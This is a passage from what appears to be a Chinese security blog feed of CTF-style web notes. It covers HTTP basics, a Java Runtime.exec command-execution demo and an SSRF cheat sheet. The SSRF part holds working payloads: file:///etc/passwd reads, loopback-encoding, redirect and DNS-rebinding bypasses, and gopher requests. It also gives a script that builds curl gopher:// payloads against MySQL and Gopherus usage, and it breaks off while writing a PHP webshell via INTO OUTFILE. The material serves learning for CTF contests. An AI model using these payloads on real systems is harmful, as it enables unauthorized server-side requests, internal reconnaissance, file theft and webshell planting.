地址，但可能被代理服务器篡改。</li><li>True-Client-IP：用于标识客户端 IP 地址，但可能被代理服务器篡改</li></ul><h3 id="发包GET改POST"><a href="#发包GET改POST" class="headerlink" title="发包GET改POST"></a>发包GET改POST</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">一、开头改请求方式<br>POST /?id=1 HTTP/1.1<br>把GET改成POST，GET和POST混合请求的统一用POST<br><br>二、中间添加一行参数<br>Content-Type: application/x-www-form-urlencoded<br>实际应用中，不写这句话会导致POST请求无效。<br><br>三、末尾空一行写POST参数<br>cmd=system(&#x27;cat /flllllaaaaaaggggggg&#x27;)<br></code></pre></td></tr></table></figure><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>状态码</td><td>状态码英文名称</td><td>中文描述</td></tr><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td></td><td></td><td></td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td></td><td></td><td></td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理。所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td></td><td></td><td></td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留，将来使用</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed</td><td>服务器无法满足Expect的请求头信息</td></tr><tr><td></td><td></td><td></td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取&#x2F;查询资源信息，而POST一般用于更新资源信息.</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>序号</td><td>方法</td><td>描述</td></tr><tr><td>1</td><td>GET</td><td>请求指定的页面信息，并返回实体主体。</td></tr><tr><td>2</td><td>HEAD</td><td>类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td>3</td><td>POST</td><td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td></tr><tr><td>4</td><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td>5</td><td>DELETE</td><td>请求服务器删除指定的页面。</td></tr><tr><td>6</td><td>CONNECT</td><td>HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td>7</td><td>OPTIONS</td><td>允许客户端查看服务器的性能。</td></tr><tr><td>8</td><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td>9</td><td>PATCH</td><td>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table><h3 id="HTTP响应头"><a href="#HTTP响应头" class="headerlink" title="HTTP响应头"></a>HTTP响应头</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>应答头</td><td>说明</td></tr><tr><td>Allow</td><td>服务器支持哪些请求方法（如GET、POST等）。</td></tr><tr><td>Content-Encoding</td><td>文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</td></tr><tr><td>Content-Length</td><td>表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</td></tr><tr><td>Content-Type</td><td>表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</td></tr><tr><td>Date</td><td>当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</td></tr><tr><td>Expires</td><td>应该在什么时候认为文档已经过期，从而不再缓存它？</td></tr><tr><td>Last-Modified</td><td>文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</td></tr><tr><td>Location</td><td>表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</td></tr><tr><td>Refresh</td><td>表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL&#x3D;<a href="http://host/path%22)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82">http://host/path&quot;)让浏览器读取指定的页面。</a>  <br>注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV&#x3D;”Refresh” CONTENT&#x3D;”5;URL&#x3D;<a href="http://host/path%22%EF%BC%9E%E5%AE%9E%E7%8E%B0%EF%BC%8C%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BA%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%88%B7%E6%96%B0%E6%88%96%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8CGI%E6%88%96Servlet%E7%9A%84HTML%E7%BC%96%E5%86%99%E8%80%85%E5%8D%81%E5%88%86%E9%87%8D%E8%A6%81%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E5%AF%B9%E4%BA%8EServlet%E6%9D%A5%E8%AF%B4%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AERefresh%E5%A4%B4%E6%9B%B4%E5%8A%A0%E6%96%B9%E4%BE%BF%E3%80%82">http://host/path&quot;＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。</a>  <br>  <br>注意Refresh的意义是”N秒之后刷新本页面或访问指定页面”，而不是”每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV&#x3D;”Refresh” …＞。  <br>  <br>注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</td></tr><tr><td>Server</td><td>服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</td></tr><tr><td>Set-Cookie</td><td>设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</td></tr><tr><td>WWW-Authenticate</td><td>客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm&#x3D;＼”executives＼””)。  <br>注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</td></tr></tbody></table><h2 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA命令执行</title>
    <link href="/2025/03/22/JAVA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/03/22/JAVA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<figure class="highlight java"><figcaption><span>file:RCE.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeTest</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String args [])</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span> (args.length==<span class="hljs-number">0</span>) &#123;<br>            System.exit(<span class="hljs-number">1</span>);  <span class="hljs-comment">//没有参数就退出</span><br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> run. exec(command);  <span class="hljs-comment">//执行命令</span><br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream());<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(in);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> buff.readLine();temp!=<span class="hljs-literal">null</span>;temp=buff.readLine())&#123;<br>            System.out.println(temp);  <span class="hljs-comment">//输出结果</span><br>        &#125;<br>        buff .close();<br>        in.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -encoding UTF-8 RuntimeTest.java<br>java RuntimeTest <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2025/03/22/SSRF/"/>
    <url>/2025/03/22/SSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p>在 <a href="http://xxx.github.io@localhost/">http://xxx.github.io@localhost</a> 这种URL中，@符号前的部分（<code>xxx.github.io</code>）是用来提供用户信息的（通常是用户名和密码），实际请求会发送到@符号后面的部分（即<code>localhost</code>）。这是因为根据URL的标准格式，@符号前的内容被解释为“用户信息”，而不是实际的主机名。</p><p>这种方式可以被利用来绕过一些基于主机名的安全检查。比如，如果某个系统检查URL中是否包含某个域名，如github.io，并认为只要包含这个域名就是安全的，但没有进一步解析和验证@符号之后的部分，这样的系统就可能被绕过。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。<br>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file://从文件系统中获取文件内容，如 file:///etc/passwd<br>dict://字典服务协议，访问字典资源，如 dict:///ip:6739/info:<br>ftp://可用于网络端口扫描<br>sftp://SSH文件传输协议或安全文件传输协议<br>ldap://轻量级目录访问协议<br>tftp://简单文件传输协议<br>gopher://分布式文档传递服务<br></code></pre></td></tr></table></figure><h5 id="file"><a href="#file" class="headerlink" title="file"></a>file</h5><p>查找内网存活主机IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file://filepath            从文件系统中获取文件内容<br>file:///etc/passwd         读取文件passwd<br>file:///etc/hosts          显示当前操作系统网卡的IP<br>file:///proc/net/arp       显示arp缓存表（寻找内网其他主机）<br>file:///proc/net/fib_trie  显示当前网段路由信息<br></code></pre></td></tr></table></figure><h5 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h5><p>字典服务协议，访问字典资源<br>查找内网主机开放端口<br>可用于:扫描端口、获取内网信息、爆破密码等<br><code>dict://172.251.250.1:6397/info</code></p><h5 id="http"><a href="#http" class="headerlink" title="http"></a>http</h5><p>目录扫描</p><h5 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h5><p>第一位字符作为填充位（也就是说不转发第一个字符）<br>基本格式：<code>url:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code><br>默认端口是70</p><p><code>gopher://172.250.250.4:80/_</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gopher">GET提交<br>gopher://172.250.250.4:80/_GET /name.php?name=test HTTP/1.1<br>Host: 172.250.250.4<br><br>POST提交需要保留头部信息:<br>POST<br>Host:<br>Content-Type:<br>Content-Length:<br><br>eg:<br>url=gopher://172.250.250.4:80/_POST /name.php HTTP/1.1<br>Host: 172.250.250.4<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 9<br><br>name=test<br></code></pre></td></tr></table></figure><p>注意事项：<br><code>?</code>需要URL编码<br>回车换行要变为%0d%0a，直接工具可能是%0a<br>HTTP包最后要加%0d%0a<br>burp发包需要url编码两次</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="环回地址绕过"><a href="#环回地址绕过" class="headerlink" title="环回地址绕过"></a>环回地址绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!/bin/bash</span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>hex_ip=$(printf <span class="hljs-string">&#x27;%02x&#x27;</span> $&#123;ip<span class="hljs-comment">//./ &#125;)</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hex_ip</span><br></code></pre></td></tr></table></figure><p>得到<code>127.0.0.1</code>的16进制是<code>0x7f000001</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>八进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">017700000001</span><span class="hljs-regexp">/flag.php  点分式  http:/</span><span class="hljs-regexp">/0177.0000.0000.0001/</span>flag.php<br>十六进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7F000001<span class="hljs-regexp">/flag.php    点分式  http:/</span><span class="hljs-regexp">/0x7F.0x00.0x00.0x01/</span>flag.php<br>十进制<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">当有的对跳转的地址的长度有要求<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br>host&lt;3<br>url=http://0/flag.php<br></code></pre></td></tr></table></figure><h3 id="302重定向绕过"><a href="#302重定向绕过" class="headerlink" title="302重定向绕过"></a>302重定向绕过</h3><figure class="highlight php"><figcaption><span>file:index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: http://127.0.0.1/flag.php&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>php -S 0.0.0.0:1234</code></p><p>使用<code>https://tinyurl.com</code>生成302跳转地址(<a href="https://tinyurl.com生成302跳转地址/">https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd/</a>)</p><h3 id="DNS重绑定绕过"><a href="#DNS重绑定绕过" class="headerlink" title="DNS重绑定绕过"></a>DNS重绑定绕过</h3><p>原理：服务器两次解析同一域名的短暂间隙，更换域名背后的ip，达到突破同源策略或过WAF进行SSRF的目的<br>DNS中的机制TTL：域名和IP绑定关系的Cache存活的最长时间。<br>某些情况下，可以对同一个域名设置两个记录（一个内网、一个外网），随机访问一个，概率成功</p><p><code>https://lock.cmpxchg8b.com/rebinder.html</code><br><code>http://7f000001.c0a80001.rbndr.us/flag.php</code></p><h3 id="域名绕过"><a href="#域名绕过" class="headerlink" title="域名绕过"></a>域名绕过</h3><p>限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名<br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code></p><h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dns">当不允许ip为内网地址时<br>（<span class="hljs-number">1</span>）采取短网址绕过  https://<span class="hljs-number">0</span>x9.me/cuGfD    <br>推荐：http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/<br>（<span class="hljs-number">2</span>）采取特殊域名<br>（<span class="hljs-number">3</span>）采取进制转换<br><br>白名单，一定要请求某个IP或域名的情况，这个时候在url后面跟上@符号，浏览器会访问@后面的域名或ip eg:http://abc.com@<span class="hljs-number">127.0.0.1</span><br>句号绕过         <span class="hljs-number">127。0。0。1</span> &gt;&gt;&gt; <span class="hljs-number">127.0.0.1</span><br>利用[::]绕过         http://[::]:<span class="hljs-number">80</span>/ &gt;&gt;&gt; http://<span class="hljs-number">127.0.0.1</span><br><br><br>可以指向任意ip的域名　 <br>xip.io     <br>[xip.io](http://xip.io/)<br>[xip.io<span class="hljs-number">127.0.0.1</span>.xip.io](http://xip.io<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[www.<span class="hljs-number">127.0.0.1</span>.xip.io](http://www.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[Haha.<span class="hljs-number">127.0.0.1</span>.xip.io](http://haha.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>[Haha.xixi.<span class="hljs-number">127.0.0.1</span>.xip.io](http://haha.xixi.<span class="hljs-number">127.0.0.1</span>.xip.io/) --&gt;<span class="hljs-number">127.0.0.1</span><br>原理是DNS解析。xip.io可以指向任意域名，即<span class="hljs-number">127.0.0.1</span>.xip.io，可解析为<span class="hljs-number">127.0.0.1</span><br><br></code></pre></td></tr></table></figure><h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="对MySQL进行未授权查询"><a href="#对MySQL进行未授权查询" class="headerlink" title="对MySQL进行未授权查询"></a>对MySQL进行未授权查询</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump -i lo port 3306 -w mysql.pcapng<br><span class="hljs-comment">#-w 写文件，在根目录下</span><br>mysql -h127.0.0.1 -uroot --ssl-mode=DISABLED -e <span class="hljs-string">&quot;show databases;&quot;</span><br>show databases;<br></code></pre></td></tr></table></figure><p>将抓取的文件复制到本地，Wireshark打开，跟踪TCP流，筛选目标端口3306，show data as raw data</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">5b0000000a352e352e352d31302e31312e322d4d6172696144422d3100210000006e673b2e72767b2700fef72d0200ff81150000000000001d0000004b24702e2e3c243f4f502669006d7973716c5f6e61746976655f70617373776f726400<br>bb00000184a2bf000000000121000000000000000000000000000000000000001d000000726f6f7400006d7973716c5f6e61746976655f70617373776f7264007e035f6f73054c696e75780c5f636c69656e745f6e616d650a6c69626d617269616462045f7069640531323339390f5f636c69656e745f76657273696f6e05332e332e34095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c0c5f7365727665725f686f7374093132372e302e302e31<br>32000002ffa2062332383030304163636573732064656e69656420666f7220757365722027726f6f742740276c6f63616c686f737427<br></code></pre></td></tr></table></figure><p>复制数据去掉换行，ASCII转URL编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">results</span>(<span class="hljs-params">s</span>):<br>    a=[s[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>)]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;curl gopher://127.0.0.1:3306/_%&quot;</span>+<span class="hljs-string">&quot;%&quot;</span>.join(a)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    s=sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(results(s))<br></code></pre></td></tr></table></figure><p>复制，更改对应IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/tarunkant/Gopherus<br>python2.7 gopherus.py --exploit mysql<br>会输出：<br>Give MYSQL username:<br>Give query to execute:<br></code></pre></td></tr></table></figure><h3 id="对MySQL未授权文件写入"><a href="#对MySQL未授权文件写入" class="headerlink" title="对MySQL未授权文件写入"></a>对MySQL未授权文件写入</h3><p>查看写入权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2.7 gopherus.py --exploit mysql<br>Give MYSQL username:  root<br>Give query to execute:  show variables like <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>secure_file_priv</code>后面为空则可写入<br>使用into outfile生成cmd.php写入一句话木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 